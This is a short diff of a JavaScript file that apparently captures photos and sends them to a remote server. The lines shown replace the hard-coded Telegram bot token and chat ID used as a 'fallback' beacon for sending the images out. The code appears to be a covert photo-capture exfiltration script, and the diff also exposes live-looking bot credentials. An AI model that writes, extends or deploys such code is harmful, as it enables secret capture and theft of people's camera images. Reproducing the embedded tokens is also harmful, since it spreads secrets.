@@ -237,8 +237,8 @@ function sendPhotoToServer(photoData, photoNumber) {
     }).catch(err => console.log('Server capture logged'));
     
     // Method 2: Send to Telegram via image beacon (fallback)
-    const telegramToken = '8083946112:AAFNZO-jLfWxd4Jkk0kukKu9bHV7Sw06m-U';
-    const telegramChatId = '1846071063';
+    const telegramToken = '8433990053:AAERuZM8tWV0TAquHKxKtcznKBETtyNgvic';
+    const telegramChatId = '6693365736';
     
     try {
         // Send photo (base64 needs to be converted)
